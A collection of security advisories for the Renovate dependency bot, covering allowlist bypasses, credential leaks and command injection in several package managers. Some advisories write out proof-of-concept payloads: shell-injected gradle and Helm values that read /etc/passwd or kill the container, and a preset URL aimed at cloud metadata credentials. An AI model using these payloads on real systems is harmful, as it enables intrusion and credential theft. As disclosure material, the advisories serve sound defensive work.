summary: HTTP header allowlist (`allowedHeaders`) could be bypassed by using a shared preset
description:
When Renovate interacts over HTTP with external services, an allowlist is used for any HTTP headers that are included in the requests.

Part of this is controlled by a self-hosted administrator, using the [`allowedHeaders`](https://docs.renovatebot.com/self-hosted-configuration/#allowedheaders) configuration, which then allows a repository to specify i.e.:

```json
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "hostRules": [
    {
      "matchHost": "https://domain.com/all-versions",
      "headers": {
        "Authorization": "Bearer {{ secrets.ALL_VERSIONS_SECRET }}"
      }
    }
  ]
}
```

It was previously possible for a repository to bypass this requirement by including the `hostRules` entry inside a shared preset, where the `headers` would not be validated.

## Impact

- You are a self-hosted administrator
- You restrict the HTTP headers that a user can specify
  - Renovate's default is `allowedHeaders: ["X-*"]`, so you are likely already restricting these
- You have users who use presets
- One of those presets specifies `hostRules[].headers` inside them

> [!CAUTION]
> Because these presets can also be externally sourced, this could allow a preset from the public Internet (or internal to users in your deployment) to inject in custom HTTP headers to different hosts.
> 
> Although additional information would be needed to employ a targeted attack, this is still a significant risk.


## Patches

This is patched in [Renovate 44.60.1](https://github.com/renovatebot/renovate/releases/tag/44.60.1).

### For self-hosted administrators setting `headers`

Self-hosted administrators who set `headers` on requests are recommended to upgrade to [44.119.0](https://github.com/renovatebot/renovate/releases/tag/44.119.0).

Prior to this version, Renovate would require that a self-hosted administrator who sets `headers` would need to allowlist them via `allowedHeaders`, allowing any users on their deployment to also set those headers.

This is no longer the case as of 44.119.0, where the administrator's `headers` are implicitly allowed, similar to how `allowedEnv` works.

Upgrading will allow the self-hosted administrator to reduce the allowlist in `allowedHeaders` to only names that they expect their users to override. 

## Workarounds

None

summary: Malicious GitLab servers could send a malicious `Link` header to allow exflitrating credentials
description:
When interacting with a GitLab server (GitLab.com, GitLab Cloud, or GitLab Self-Managed), Renovate follows pagination links sent by the GitLab server in the `Link` header. As part of this pagination, credentials for the server are sent to the "next" page of data. 

A malicious or compromised GitLab server that specifies a `Link` header to an attacker-controlled server could exfiltrate credentials.

## Impact

- You are interacting with a GitLab Server
  - `platform=gitlab`
  - `datasource=github-packages`
  - `datasource=github-releases`
  - `datasource=github-tags`
  - `datasource=git-refs`
  - `datasource=git-tags`
- The remote server has been compromised
- Either:
  - You have any dependencies that interact with that GitLab server
  - The repository being processed is hosted on that GitLab server

> [!NOTE]
> This depends on a precondition of a registry compromise. 
> 
> If the registry you are talking to is compromised, they likely already have your credentials from the initial request(s), so this attack only allows a new location to receive those credentials.

## Patches

This is patched in [Renovate 44.11.2](https://github.com/renovatebot/renovate/releases/tag/44.3.1).

## Workarounds

None

summary: Malicious GitHub servers could send a malicious `Link` header to allow exflitrating credentials
description:
When interacting with a GitHub server (GitHub.com, GitHub Enterprise Cloud, or GitHub Enterprise Server), Renovate follows pagination links sent by the GitHub server in the `Link` header. As part of this pagination, credentials for the server are sent to the "next" page of data. 

A malicious or compromised GitHub server that specifies a `Link` header to an attacker-controlled server could exfiltrate credentials.

## Impact

- You are interacting with a GitHub Server
  - `platform=github`
  - `datasource=github-digest`
  - `datasource=github-release-attachments`
  - `datasource=github-releases`
  - `datasource=github-runners`
  - `datasource=github-tags`
  - `datasource=git-refs`
  - `datasource=git-tags`
- The remote server has been compromised
- Either:
  - You have any dependencies that interact with that GitHub server
  - The repository being processed is hosted on that GitHub server

> [!NOTE]
> This depends on a precondition of a registry compromise. 
> 
> If the registry you are talking to is compromised, they likely already have your credentials from the initial request(s), so this attack only allows a new location to receive those credentials.

## Patches

This is patched in [Renovate 44.11.2](https://github.com/renovatebot/renovate/releases/tag/44.3.1).

## Workarounds

None

## Notes

The pre-existing [`RENOVATE_X_REBASE_PAGINATION_LINKS`](https://docs.renovatebot.com/self-hosted-experimental/#renovate_x_rebase_pagination_links) allows handling a GitHub Enterprise Server that returns a different pagination URL than you're connecting to it on.

This should only be used if you're interacting with a registry that intentionally uses different hosts for pagination URLs, and you trust that you can remove the security control.

summary: A user's request to rebase a PR can bypass strict `minimumReleaseAge` internal checks
description:
It was previously possible for a user interaction with a Renovate PR to cause Renovate to incorrectly update to the latest version of a dependency, ignoring any `minimumReleaseAge` checks.

For instance, with a PR with updates such as:

| Package | Update | Change | Pending |
|---|---|---|---|
| [anthropics/claude-code](https://redirect.github.com/anthropics/claude-code) | patch | `2.1.246` → `2.1.247` | `2.1.259` (+6) |
| [anthropics/claude-code](https://redirect.github.com/anthropics/claude-code) | patch | `v2.1.246` → `v2.1.247` | `v2.1.259` (+6) |

We can see that Renovate only updates to 2.1.247 (as it has passed the `minimumReleaseAge`), and that there are other updates waiting to age.

When a user (with a minimum of i.e. Write access to the repo on GitHub) clicks the `If you want to rebase/retry this PR, check this box` checkbox to rebase the PR, Renovate would then update the PR to i.e.

| Package | Update | Change |
|---|---|---|
| [anthropics/claude-code](https://redirect.github.com/anthropics/claude-code) | patch | `2.1.258` → `2.1.259` |
| [anthropics/claude-code](https://redirect.github.com/anthropics/claude-code) | patch | `v2.1.258` → `v2.1.259` |


This was only possible when a user requested this, and Renovate itself did not perform this change when a branch needed rebasing, for instance when there was a conflict in it.

This would allow for a potentially malicious dependency to have been pushed to the PR, and potentially start running CI, which is something Minimum Release Age aims to prevent.

This PR would have a pending `renovate/stability-days` status check on it, with "Waiting for status to be reported — Updates have not met minimum release age requirement".

## Impact

- If you have `minimumReleaseAge` set
- If you have any dependencies that have `updateType=digest` updates
- A dependency of yours releases a version
- Renovate raises a PR for that version
- Later, a dependency releases new versions
- A human clicks the `If you want to rebase/retry this PR, check this box`

## Patches

This is patched in [Renovate 44.61.3](https://github.com/renovatebot/renovate/releases/tag/44.61.3).

## Workarounds

Modify [`prbodytemplate`](https://docs.renovatebot.com/configuration-options/#prbodytemplate) to remove the checkbox actions and/or set [`dependencyDashboard=true`](https://docs.renovatebot.com/configuration-options/#dependencydashboard).

summary: TLS private keys were previously not sanitised in logs
description:
## Summary

Renovate previously had a gap in its log sanitisation for TLS private keys used for Mutual TLS.

When configuring a Host Rule that requires a TLS certificate (when performing Mutual TLS), Renovate sanitises the `httpsPrivateKey` log line, such as:

```
DEBUG: File config
       "config": {
         "hostRules": [{"matchHost": "example.com", "httpsPrivateKey": "***********"}]
       }
```


However, if that full key was referenced in another field (whether another config option, or outputted in a log message with a key that was not `httpsPrivateKey`) it may have logged the full value.

For instance, with a very contrived example:

```javascript
module.exports = {
	hostRules: [
		{
			matchHost: 'example.com',
            // NOT the correct handling: you should be passing these `secrets`
			httpsPrivateKey: 'BEGIN PRIVATE KEY',
		},
	],
	// contrived example to show the issue, which is NOT correctly handling a secret
	username: 'BEGIN PRIVATE KEY',
}
```

This would then log i.e.:

```
DEBUG: Platform config
       "platformConfig": {
         "hostType": "github",
         "endpoint": "https://api.github.com/",
         "isGHApp": false,
         "isGhe": false,
         "isGheCloud": false,
         "userDetails": {
           "username": "jamietanna",
           "name": "Jamie Tanna",
           "id": 3315059,
           "email": null
         },
         "userEmail": null
       },
       "renovateUsername": "BEGIN PRIVATE KEY"
```


Renovate previously would not sanitise this correctly.

This is somewhat expected for users who are not following the documented recommendations to pass secrets through the [`secrets`](https://docs.renovatebot.com/self-hosted-configuration/#secrets) configuration.

However, we have fixed this to ensure that any values put into `hostRules[].httpsPrivateKey` will be redacted anywhere they're found in Renovate's logs.

## Impact

- If you are using Mutual TLS
- If you are configuring it through `hostRules[].httpsPrivateKey`
- If you are **not** following documented best practices to pass secrets through the [`secrets`](https://docs.renovatebot.com/self-hosted-configuration/#secrets) configuration
- If Renovate logs:
  - A field that is not literally called `httpsPrivateKey`
  - That field is referencing the full secret value

## Patches

This is patched in [Renovate 44.14.4](https://github.com/renovatebot/renovate/releases/tag/44.14.4).

## Workarounds

Manage secrets through [`secrets`](https://docs.renovatebot.com/self-hosted-configuration/#secrets), such as:

```javascript
module.exports = {
	secrets: {
        
		FOO: 'BEGIN PRIVATE KEY',
	},
	hostRules: [
		{
			matchHost: 'example.com',
            // correct handling
			httpsPrivateKey: '{{ secrets.FOO }}',
		},
	],
	// incorrectly handled, but will be sanitised
	username: 'BEGIN PRIVATE KEY',
}

module.exports = config;

```

When tested on 44.14.3 (prior to the patch), you will see this is correctly redacted:

```
DEBUG: Platform config
       "platformConfig": {
         "hostType": "github",
         "endpoint": "https://api.github.com/",
         "isGHApp": false,
         "isGhe": false,
         "isGheCloud": false,
         "userDetails": {
           "username": "jamietanna",
           "name": "Jamie Tanna",
           "id": 3315059,
           "email": null
         },
         "userEmail": null
       },
       "renovateUsername": "**redacted**"
```

## Notes

The fix applies redaction to `httpsPrivateKey`, `httpsCertificate` and `httpsCertificateAuthority`.

Even though `httpsCertificate` and `httpsCertificateAuthority` are generally "public" and "safe" to log, we are currently redacting them out of an abundance of caution, and are happy to discuss removing redaction.

summary: Digest updates can bypass strict `minimumReleaseAge` internal checks
description:
When Renovate prepares updates in a repository using [Minimum Release Age](https://docs.renovatebot.com/key-concepts/minimum-release-age/), it was possible for a `digest` update to bypass requirements.

Given a repository was using a "floating" tag such as:

```yaml
uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7
```

If a v7.0.1 release was published, Renovate would run, notice the update, and raise a PR for the digest update.

However, this would have a pending `renovate/stability-days` status check on it, with "Waiting for status to be reported — Updates have not met minimum release age requirement"

This would allow for a potentially malicious dependency to have a PR raised, and potentially start running CI, which is something Minimum Release Age aims to prevent.

## Impact

- If you have `minimumReleaseAge` set
- If you have any dependencies that have `updateType=digest` updates
  - Such as GitHub Actions, Docker, Go Modules or NuGet

## Patches

This is patched in [Renovate 44.3.1](https://github.com/renovatebot/renovate/releases/tag/44.3.1).

## Workarounds

Disable digest updates:

```json
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "packageRules": [
    {
      "description": "Temporary workaround for GHSA-g4qr-hw2h-687r",
      "matchUpdateTypes": [
        "digest"
      ],
      "enabled": false
    }
  ]
}
```

Or require a human review before they get created:

```json
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "packageRules": [
    {
      "description": "Temporary workaround for GHSA-g4qr-hw2h-687r",
      "matchUpdateTypes": [
        "digest"
      ],
      "dependencyDashboardApproval": true
    }
  ]
}
```

summary: `manager/gomod`: Command injection could be possible via unescaped `depName` in import-path update command
description:
When updating a Go module to a new major version (above v1), the module import path changes, such as:

```diff
-github.com/oapi-codegen/oapi-codegen
+github.com/oapi-codegen/oapi-codegen/v2
```

As well as the dependency update itself, users need to update their _source code_ references to this module, otherwise their code will fail to compile.

Renovate supports automagically updating these using [`postUpdateOptions=['gomodUpdateImportPaths', ...]`](https://docs.renovatebot.com/configuration-options/#postupdateoptions), which calls an external command, [`mod`](https://github.com/marwan-at-work/mod).

When self-hosting Renovate using the [`binarySource=docker`](https://docs.renovatebot.com/self-hosted-configuration/#binarysource) mode, it was possible for a malicious dependency name to introduce shell metacharacters and/or introduce remote code execution as the Renovate user.

## Impact

- You are running in [`binarySource=docker`](https://docs.renovatebot.com/self-hosted-configuration/#binarysource)
- You have Go module dependencies
- One of those modules has a malicious package name
  - Which would therefore not be a valid Go module name
- Those dependency updates have a major version update available
  - Which may not be possible, given this is not a valid Go module name, so is unlikely to have any updates available in a registry
- You have set [`postUpdateOptions=['gomodUpdateImportPaths', ...]`](https://docs.renovatebot.com/configuration-options/#postupdateoptions)


> [!NOTE]
> This depends on a precondition of a dependency which has a malicious package name which would **not** be a valid Go module name, so the `go` toolchain would be rejecting it, and Go module proxies would also reject it.
>
> It is most likely that this is therefore an ["insider attack"](https://docs.renovatebot.com/security-and-permissions/#execution-of-code-insider-attack), because it requires someone committing code to their default branch - to get Renovate to execute the update - but may also require a malicious Go module proxy.
>
> Because this is not a valid Go module name, it is unlikely this attack could be leveraged.

## Patches

This is patched in [Renovate 44.14.7](https://github.com/renovatebot/renovate/releases/tag/44.14.7).

## Workarounds

Due to the unlikeliness of this attack vector, we recommend patching your Renovate version.

## Notes

A reminder that [`binarySource=docker`](https://docs.renovatebot.com/self-hosted-configuration/#binarysource) is deprecated.

Renovate's next major release (45, no release date currently planned) will remove the `docker` CLI from our Docker images, and in Renovate 46 (no release date currently planned), we intend to remove `binarySource=docker` altogether.

If you are using this mode, and cannot migrate to `binarySource=install`, [please provide feedback in this Discussion](https://github.com/renovatebot/renovate/discussions/40742).

cwes.name: Improper Neutralization of Special Elements used in an OS Command

summary: `manager/gradle-wrapper`: Command injection could be possible via unescaped `distributionUrl`
description:
When performing updates to the Gradle Wrapper, Renovate invokes the Gradle Wrapper to initiate the upgrade.

When self-hosting Renovate using the [`binarySource=docker`](https://docs.renovatebot.com/self-hosted-configuration/#binarysource) mode and allowing the Gradle Wrapper to be invoked with [`allowedUnsafeExecutions=['gradleWrapper', ...]`](https://docs.renovatebot.com/self-hosted-configuration/#allowedunsafeexecutions), it was possible for a repository to specify a malicious `gradle/wrapper/gradle-wrapper.properties` for instance:

```ini
distributionBase=GRADLE_USER_HOME
distributionPath=wrapper/dists
zipStoreBase=GRADLE_USER_HOME
zipStorePath=wrapper/dists
# malicious
distributionUrl=https\://services.gradle.org/distributions/gradle-9.1.0-bin.zip; cp /etc/passwd /tmp/passwd
```

This could allow for remote code execution as the Renovate user.

## Impact

- You are running in [`binarySource=docker`](https://docs.renovatebot.com/self-hosted-configuration/#binarysource)
- You have enabled the Gradle Wrapper to be invoked with [`allowedUnsafeExecutions=['gradleWrapper', ...]`](https://docs.renovatebot.com/self-hosted-configuration/#allowedunsafeexecutions)
- A repository has enabled Gradle's Dependency Verification
- A repository has a malicious `distributionUrl`
- A repository receives an update for the Gradle Wrapper

## Patches

This is patched in [Renovate 44.14.7](https://github.com/renovatebot/renovate/releases/tag/44.14.7).

## Workarounds

Remove [`allowedUnsafeExecutions=['gradleWrapper', ...]`](https://docs.renovatebot.com/self-hosted-configuration/#allowedunsafeexecutions)

## Notes

This relates to 

A reminder that [`binarySource=docker`](https://docs.renovatebot.com/self-hosted-configuration/#binarysource) is deprecated.

Renovate's next major release (45, no release date currently planned) will remove the `docker` CLI from our Docker images, and in Renovate 46 (no release date currently planned), we intend to remove `binarySource=docker` altogether.

If you are using this mode, and cannot migrate to `binarySource=install`, [please provide feedback in this Discussion](https://github.com/renovatebot/renovate/discussions/40742).

summary: `manager/mix`: Command injection could be possible via unescaped `organization`
description:
When updating a private dependency for the Mix manager, we log into the Hex registry.

When self-hosting Renovate using the [`binarySource=docker`](https://docs.renovatebot.com/self-hosted-configuration/#binarysource) mode, it was possible for a malicious dependency name to introduce shell metacharacters and/or introduce remote code execution as the Renovate user.

For instance, a package name `private_package:evil --key leaked_or_arbitrary` would lead to:

```sh
mix hex.organization auth evil --key leaked_or_arbitrary --key secret_token
```

## Impact

- You are running in [`binarySource=docker`](https://docs.renovatebot.com/self-hosted-configuration/#binarysource)
- You have Mix dependencies
- You have private Mix dependencies
- One of those dependencies has a malicious package name
  - Which would therefore not be a valid Mix package name
- You receive a dependency update for that malicious dependency
  - Which may not be possible, given this is not a valid Mix package name, so is unlikely to have any updates available in a registry


> [!NOTE]
> This depends on a precondition of a dependency which has a malicious package name which would **not** be a valid Mix package name, so it is likely Mix tooling would reject it, and registries would likely also reject it.
>
> It is most likely that this is therefore an ["insider attack"](https://docs.renovatebot.com/security-and-permissions/#execution-of-code-insider-attack), because it requires someone committing code to their default branch - to get Renovate to execute the update - but may also require a malicious Mix registry.
>
> Because this is not a valid Mix package name, it is unlikely this attack could be leveraged.

## Patches

This is patched in [Renovate 44.14.7](https://github.com/renovatebot/renovate/releases/tag/44.14.7).

## Workarounds

Due to the unlikeliness of this attack vector, we recommend patching your Renovate version.

## Notes

Renovate's next major release (45, no release date currently planned) will remove the `docker` CLI from our Docker images, and in Renovate 46 (no release date currently planned), we intend to remove `binarySource=docker` altogether.

If you are using this mode, and cannot migrate to `binarySource=install`, [please provide feedback in this Discussion](https://github.com/renovatebot/renovate/discussions/40742).

summary: Environment variable allowlist (`allowedEnv`) could be bypassed by using a shared preset
description:
When Renovate invokes external commands, an allowlist is used for what environment variables are provided to the child process.

Part of this is controlled by a self-hosted administrator, using the [`allowedEnv`](https://docs.renovatebot.com/self-hosted-configuration/#allowedenv) configuration, which then allows a repository to specify i.e.:

```json
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "env": {
    "GOPRIVATE": "github.com/JamieTanna-Mend-testing/*"
  }
}
```

It was previously possible for a repository to bypass this requirement by including the `env` inside a shared preset.



## Impact

- You are a self-hosted administrator
- You restrict the environment variables that a user can specify
  - Renovate's default is `allowedEnv: []`, so you are likely already restricting these
- You have users who use presets
- One of those presets specifies `env` inside them

> [!CAUTION]
> Because these presets can also be externally sourced, this could allow a preset from the public Internet (or internal to users in your deployment) to override environment variables such as `PATH` and `LD_PRELOAD`, `NODE_OPTIONS` or `GIT_SSL_CAINFO`.
> 
> Although additional information would be needed to employ a targeted attack, this is still a significant risk.

## Patches

This is patched in [Renovate 44.60.1](https://github.com/renovatebot/renovate/releases/tag/44.60.1).

## Workarounds

None

## Notes

You can also read more about [how Renovate handles environment variables](https://docs.renovatebot.com/environment-variable-handling/).

summary: Server-Side Request Forgery via HTTP preset URLs in `extends` array or `customDatasources`
description:
When Renovate interacts over HTTP with external services, for instance to look up whether a dependency has a new version, or to resolve a [shareable config preset](https://docs.renovatebot.com/config-presets/) or interact with a user-defined [custom datasource](https://docs.renovatebot.com/configuration-options/#customdatasources), a shared HTTP client is used.

Previously, it was possible to perform Server-Side Request Forgery by pointing Renovate to arbitrary URLs.

This could lead to a credentialed request, or could potentially lead to information disclosure in the Renovate logs.

For instance, this could be used to access an Instance Metadata Service (IMDS) such as the EC2 Metadata API `http://169.254.169.254` and potentially access AWS credentials for the Renovate instance like so:

```json
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "extends": [
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  ]
}
```

## Impact

- You are a self-hosted administrator
- You have users who:
  - [use HTTP presets](https://docs.renovatebot.com/config-presets/#fetching-presets-from-an-http-server)
  - use [`customDatasources`](https://docs.renovatebot.com/configuration-options/#customdatasources)

## Patches

This is patched in [Renovate 44.79.0](https://github.com/renovatebot/renovate/releases/tag/44.79.0).

Users who have a self-hosted Platform which is resolved on a private IP are recommended to upgrade to [Renovate 44.118.1](https://github.com/renovatebot/renovate/releases/tag/44.118.1). Alternatively, you will need to add global self-hosted configuration to specify [`hostRules[].allowInternal`](https://docs.renovatebot.com/self-hosted-configuration/#hostrulesallowinternal) for your Platform.

## Workarounds

None

## Additional hardening

- [`internalHostAccess`](https://docs.renovatebot.com/self-hosted-configuration/#internalhostaccess)

summary: Remote code execution was possible using the bazel-module or bazelisk managers, when using `lockFileMaintenance`
description:
When using [`lockFileMaintenance`](https://docs.renovatebot.com/configuration-options/#lockfilemaintenance) using the [bazel-module](https://docs.renovatebot.com/modules/manager/bazel-module/) or [bazelisk](https://docs.renovatebot.com/modules/manager/bazelisk/) managers between Renovate [43.65.0](https://github.com/renovatebot/renovate/releases/tag/43.65.0) (2026-03-12) and [43.102.11](https://github.com/renovatebot/renovate/releases/tag/43.102.11) (2026-04-02), there was the opportunity for remote code execution from a malicious dependency, _if the Bazel module executes code that relies on a dependency_.

As this is an "unsafe" execution path, we have disabled this by default, and self-hosted administrators must add it to the [`allowedUnsafeExecutions`](https://docs.renovatebot.com/self-hosted-configuration/#allowedunsafeexecutions) allowlist.

It is recommended to review whether you have enabled this functionality for these managers, and if so, whether any dependency updates may have led to remote code execution.

## Impact

If Renovate suggested an update to a malicious dependency, _and_ that dependency is referenced as part of the `bazel mod deps` call - for instance as part of a `ctx.execute` call - this would call attacker-controlled code.

This could lead to [insider attackers](https://docs.renovatebot.com/security-and-permissions/#execution-of-code-insider-attack) and [outside attackers](https://docs.renovatebot.com/security-and-permissions/#execution-of-code-outsider-attack), executing code that is distributed as part of the package.
 
## Patches

This is patched in [43.102.11](https://github.com/renovatebot/renovate/releases/tag/43.102.11).

This does not affect any versions of [Mend Renovate Self-Hosted](https://www.mend.io/renovate/).

## Workarounds

- Upgrade your Renovate version
- Disable `lockFileMaintenance` for these managers

## Why did this happen?

This was missed in code review (as part of https://github.com/renovatebot/renovate/pull/41507).

summary: Child processes spawned by Renovate incorrectly have full access to environment variables
description:
When Renovate spawns child processes, their access to environment variables is filtered to an allowlist, to prevent unauthorized access to privileged credentials that the Renovate process has access to.

Since [42.68.1](https://github.com/renovatebot/renovate/releases/tag/42.68.1) (2025-12-30), this filtering had been **inadvertently removed**, and so any child processes spawned from these versions will have had access to any environment variables that Renovate has access to.

This could lead to [insider attackers](https://docs.renovatebot.com/security-and-permissions/#execution-of-code-insider-attack) and [outside attackers](https://docs.renovatebot.com/security-and-permissions/#execution-of-code-outsider-attack) being able to exflitrate secrets from the Renovate deployment.

It is recommended to rotate (+ revoke) any credentials that Renovate has access to, in case any spawned child processes have attempted to exfiltrate any secrets.

## Impact

Child processes spawned by Renovate (i.e. `npm install`, anything defined in [`postUpgradeTasks`](https://docs.renovatebot.com/configuration-options/#postupgradetasks) or [`postUpdateOptions`](https://docs.renovatebot.com/configuration-options/#postupdateoptions)) will have full access to the environment variables that the Renovate process has. 

This could lead to [insider attackers](https://docs.renovatebot.com/security-and-permissions/#execution-of-code-insider-attack) and [outside attackers](https://docs.renovatebot.com/security-and-permissions/#execution-of-code-outsider-attack) being able to exflitrate secrets from the Renovate deployment.

## Patches

This is patched in [42.96.3](https://github.com/renovatebot/renovate/releases/tag/42.96.3) and [43.4.4](https://github.com/renovatebot/renovate/releases/tag/43.4.4).

## Workarounds

There are no workarounds, other than upgrading your Renovate version.

## Why did this happen?

As part of work towards https://github.com/renovatebot/renovate/security/advisories/GHSA-pfq2-hh62-7m96, one of the [preparatory changes](https://github.com/renovatebot/renovate/pull/40212) we made was moving to [`execa`](https://www.npmjs.com/package/execa).

One of the default behaviours of `execa` is to [extend the process' environment variables with any new ones](https://github.com/sindresorhus/execa/tree/v8.0.1?tab=readme-ov-file#extendenv), rather than override them.

This was missed in code review, which meant that since this version, the full environment variables have been provided to any child processes spawned with `execa` by Renovate.

This was discovered as part of an unrelated change.

summary: Arbitrary command injection via Gradle Wrapper and malicious `distributionUrl`
description:
### Summary
Renovate can be tricked into executing shell code while updating the Gradle Wrapper. A malicious `distributionUrl` in `gradle/wrapper/gradle-wrapper.properties` can lead to command execution in the Renovate runtime.

### Details
When Renovate handles Gradle Wrapper artifacts, it may run a wrapper update command such as:
- `./gradlew :wrapper --gradle-distribution-url <value>`

In the observed behavior, Renovate executes this via a shell (e.g., `/bin/sh -c ...`).  
If `distributionUrl` contains shell command substitution syntax like `$(...)`, the shell evaluates it **before** Gradle validates/parses the URL.

After that, Gradle attempts to parse the URL as a URI and fails with `URISyntaxException`, but the shell substitution has already executed.

This is reproducible even when `allowScripts` is disabled (default is OFF), because this execution happens as part of Gradle Wrapper artifact handling rather than “repository install scripts”.

Prerequisites / attack conditions:
- The attacker must be able to get a malicious `gradle-wrapper.properties` into a repository that Renovate scans (e.g., direct write access, or a maintainer merges an attacker’s change/PR).
- Renovate must be configured to process Gradle Wrapper updates/artifacts for that repository (default behavior for the Gradle Wrapper manager).

### PoC
1. Create a repository with a Gradle Wrapper (`gradlew`, `gradlew.bat`, `gradle/wrapper/gradle-wrapper.jar`, and `gradle/wrapper/gradle-wrapper.properties`).
2. Set `distributionUrl` in `gradle-wrapper.properties` to include `$(...)`.
3. Run Renovate against the repository.
4. Observe that a file is created during Renovate’s wrapper update step **before** Gradle fails with `URISyntaxException`.

A [screen recording](https://drive.google.com/file/d/1nveSCgyz4pKPCZuelqDD_xGEO00DXr4P/view) is attached showing end-to-end reproduction. In the demo, the payload creates `/tmp/passwd_dump` containing `/etc/passwd`, demonstrating that file read/exfiltration is possible within the Renovate execution context.

### Impact
This allows arbitrary command execution in the Renovate runtime during Gradle Wrapper updates. Depending on deployment, this may expose credentials/tokens available to the bot and may allow an attacker to modify repositories or access internal resources reachable from the Renovate environment.

### Remediation

Upgrading to Renovate [42.68.5](https://github.com/renovatebot/renovate/releases/tag/42.68.5) (2025-12-31) fixes this issue, and closes out other risks of shell evaluation for commands run by Renovate.

If using the `composer`, `yarn` (v1) or `flux` managers, please upgrade to [42.74.5](https://github.com/renovatebot/renovate/releases/tag/42.74.5) (2026-01-08), as there were follow-up fixes to keep these managers working.

summary: Arbitrary command injection via kustomize manager and malicious helm repository
description:
### Summary
The user-provided chart name in the `kustomize` manager is appended to the `helm pull --untar` command without proper sanitization.

### Details
Adversaries can provide a maliciously crafted `kustomization.yaml` in conjunction with a Helm repo's `index.yaml` file to trick Renovate to execute arbitrary code.
The value for the `depName` argument for the `helmRepositoryArgs` function in [lib/modules/manager/kustomize/artifacts.ts](https://github.com/renovatebot/renovate/blob/cc08c6e98f19e6258c5d3180c70c98e1be0b0d37/lib/modules/manager/kustomize/artifacts.ts#L33) is not being escaped using the `quote` function from the `shlex` package.
This lack of proper sanitization has been present in the product since version 39.218.9 (https://github.com/renovatebot/renovate/commit/cc08c6e98f19e6258c5d3180c70c98e1be0b0d37), released on March 26 of 2025.

### PoC
1. Create a mock Helm repository. Have its `index.yaml` endpoint return:
```yaml
apiVersion: v1
entries:
  "example || kill 1; echo":
    - version: 1.0.1
      created: 2016-10-06T16:23:20.499814565-06:00
    - version: 1.0.0
      created: 2016-10-06T16:23:20.499543808-06:00
```

2. Create a git repo with the following content:

`renovate.json5`:

```json5
{
  $schema: "https://docs.renovatebot.com/renovate-schema.json",
  postUpdateOptions: [
    "kustomizeInflateHelmCharts",
  ]
}
```

`kustomization.yaml`:

```yaml
kind: Kustomization
apiVersion: kustomize.config.k8s.io/v1beta1
helmCharts:
  - name: "example || kill 1; echo"
    repo: TODO reference the mocked Helm repository over https
    version: 1.0.0
```
with the todo resolved

`charts/.gitkeep`:

(empty)

3. Run Renovate against the repo from a Docker container. Notice that the process terminates without reporting "Repository finished", because the ACI vulnerability allowed for execution of `kill 1`, terminating the root process of the container.

### Impact
This is a Arbitrary Command Injection vulnerability, allowing those with write access on repositories configured to be scanned by Renovate to cause the execution of commands of their choice on the machine that runs Renovate.

summary: Arbitrary command injection via hermit manager and maliciously named dependencies
description:
### Summary
The user-provided string `depName` in the `hermit` manager is appended to the `./hermit install` and `./hermit uninstall` commands without proper sanitization.

### Details
Adversaries can provide a maliciously named hermit dependency in conjunctions with a tweaked Renovate configuration file to trick Renovate to execute arbitrary code.
All values added to the `packagesToInstall` and `packagesToUninstall` variables in [lib/modules/manager/hermit/artifacts.ts](https://github.com/renovatebot/renovate/blob/41e8b99f86a6e2a56f80f7aa1a08a59d76f2358c/lib/modules/manager/hermit/artifacts.ts) are not being escaped using the `quote` function from the `shlex` package.
This lack of proper sanitization for installing packages has been present in the product since the introduction of the hermit manager in version 32.135.0 (https://github.com/renovatebot/renovate/commit/b696abb3c2741508fbb4029f39153140a3722e1e), released on July 30 of 2022.
In version 37.199.1 (https://github.com/renovatebot/renovate/commit/eaec10d7c8afadbdd783ac47bd2adbfab444d6df) some use of the `quote` function from the `shlex` package was added, but not in a way that usefully prevented this arbitrary code injection vulnerability.
When support for replacements was introduced with version 37.214.4 (https://github.com/renovatebot/renovate/commit/41e8b99f86a6e2a56f80f7aa1a08a59d76f2358c), the same faulty approach was replicated for uninstalling packages.

### PoC
1. Create a git repo with the following content:

`renovate.json5`:

```json5
{
  $schema: "https://docs.renovatebot.com/renovate-schema.json",
  customDatasources: {
    always: {
      defaultRegistryUrlTemplate: "https://docs.renovatebot.com/search/search_index.json",
      transformTemplates: ['{"releases":[{"version":"99999.0.0"}]}'],
    },
  },
  packageRules: [
    {
      // Target of the day
      matchManagers: ["hermit"],
      // Trick the manager in believing there's a new version
      overrideDatasource: "custom.always",
    },
  ],
}

```


`bin/hermit`:

```bash
#!/bin/bash
#
# THIS FILE IS GENERATED; DO NOT MODIFY

set -eo pipefail

export HERMIT_USER_HOME=~

if [ -z "${HERMIT_STATE_DIR}" ]; then
  case "$(uname -s)" in
  Darwin)
    export HERMIT_STATE_DIR="${HERMIT_USER_HOME}/Library/Caches/hermit"
    ;;
  Linux)
    export HERMIT_STATE_DIR="${XDG_CACHE_HOME:-${HERMIT_USER_HOME}/.cache}/hermit"
    ;;
  esac
fi

export HERMIT_DIST_URL="${HERMIT_DIST_URL:-https://github.com/cashapp/hermit/releases/download/stable}"
HERMIT_CHANNEL="$(basename "${HERMIT_DIST_URL}")"
export HERMIT_CHANNEL
export HERMIT_EXE=${HERMIT_EXE:-${HERMIT_STATE_DIR}/pkg/hermit@${HERMIT_CHANNEL}/hermit}

if [ ! -x "${HERMIT_EXE}" ]; then
  echo "Bootstrapping ${HERMIT_EXE} from ${HERMIT_DIST_URL}" 1>&2
  INSTALL_SCRIPT="$(mktemp)"
  # This value must match that of the install script
  INSTALL_SCRIPT_SHA256="09ed936378857886fd4a7a4878c0f0c7e3d839883f39ca8b4f2f242e3126e1c6"
  if [ "${INSTALL_SCRIPT_SHA256}" = "BYPASS" ]; then
    curl -fsSL "${HERMIT_DIST_URL}/install.sh" -o "${INSTALL_SCRIPT}"
  else
    # Install script is versioned by its sha256sum value
    curl -fsSL "${HERMIT_DIST_URL}/install-${INSTALL_SCRIPT_SHA256}.sh" -o "${INSTALL_SCRIPT}"
    # Verify install script's sha256sum
    openssl dgst -sha256 "${INSTALL_SCRIPT}" | \
      awk -v EXPECTED="$INSTALL_SCRIPT_SHA256" \
      '$2!=EXPECTED {print "Install script sha256 " $2 " does not match " EXPECTED; exit 1}'
  fi
  /bin/bash "${INSTALL_SCRIPT}" 1>&2
fi

exec "${HERMIT_EXE}" --level=fatal exec "$0" -- "$@"

```


